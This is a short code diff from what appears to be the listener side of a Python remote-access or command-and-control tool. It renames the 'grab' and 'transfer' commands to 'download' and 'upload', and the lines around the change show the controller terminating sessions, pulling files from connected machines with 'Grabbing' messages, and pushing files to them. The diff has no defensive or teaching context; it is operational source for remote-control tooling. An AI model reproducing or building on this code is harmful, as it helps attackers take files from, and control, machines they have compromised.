@@ -174,7 +174,7 @@ def Listener():
                                                 conn.send('terminate'.encode('utf-8'))
                                                 conn.close()
                                                 break
-                                            elif 'grab' in command:
+                                            elif 'download' in command:
                                                 conn.send(command.encode('utf-8'))
                                                 file_name = conn.recv(1024).decode('utf-8')
                                                 print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Grabbing [" + file_name + "]...")
@@ -193,7 +193,7 @@ def Listener():
                                                         c += len(data)
                                                     end_time = time.time()
                                                 print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] File Grabbed. Total time: ", end_time - start_time)
-                                            elif 'transfer' in command:
+                                            elif 'upload' in command:
                                                 conn.send(command.encode('utf-8'))
                                                 file_name = command[9:]
                                                 file_size = os.path.getsize(file_name)
